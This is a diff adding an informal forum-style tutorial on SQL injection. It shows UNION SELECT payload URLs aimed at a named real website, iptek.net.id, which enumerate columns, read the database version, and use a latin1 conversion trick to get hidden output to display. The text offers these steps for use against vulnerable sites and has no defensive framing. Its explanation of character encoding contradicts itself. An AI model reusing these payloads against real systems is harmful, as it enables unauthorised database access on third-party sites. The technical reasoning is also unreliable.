@@ -1,0 +1,43 @@
+Huy guys,
+
+This's just little information I wanna show to u all here. It's about database character encoding used on server. As u know that there are lots of character encoding method used by webmaster out there such as UTF 8, latin1, etc. Each of encoding techniques has its effective way for showing characters in the client machine. What does it mean ?
+
+Okay, suppose that we have webserver with latin1-encoded database. Latin1 will support character from The Americas, Western Europe, Oceania, and much of Africa. Client user will get character/output from webserver normally. But, how if the client is from East -Asian ?? Sure, latin1 encoding technique won't support it. So, what the relation between latin1 encoding and database SQL ?
+
+Well guys...
+
+#1. Let's take one sample vulnerable web :
+
+http://www.iptek.net.id/ind/?mnu=1&ch=berita&id=-659 union all select 1,2,3,4,5,6,7,8,9,10/*
+
+
+
+
+
+#2. Check the database version
+
+http://www.iptek.net.id/ind/?mnu=1&ch=berita&id=-659 union all select 1,2,3,version(),5,6,7,8,9,10/*
+
+
+
+
+
+Look !!
+Nothing appear on the screen, why ??
+This's because the webserver is using another encoding instead of UTF8. How do we know that it uses UTF8 for encoding ?
+I just guess since UTF 8 is generally used by most webserver out there. And how do we resolve this ?
+
+#3. Use another character encoding
+
+ 
+http://www.iptek.net.id/ind/?mnu=1&ch=berita&id=-659 union all select 1,2,3,convert(version() using latin1),5,6,7,8,9,10/* 
+
+
+
+Why we should use latin1 not the other character encoding ??
+Because latin 1 is the previous character encoding developed on SQL (version 3/4) before UTF8. So, we can guess from here that latin 1 must be used instead of UTF 8.
+
+#4. Yuppy... now the database version could be read on the screen.
+
+Most SQL-injector usually forget about this technique. So, hope u won't forget this after u read my article.
+Thx man. :)
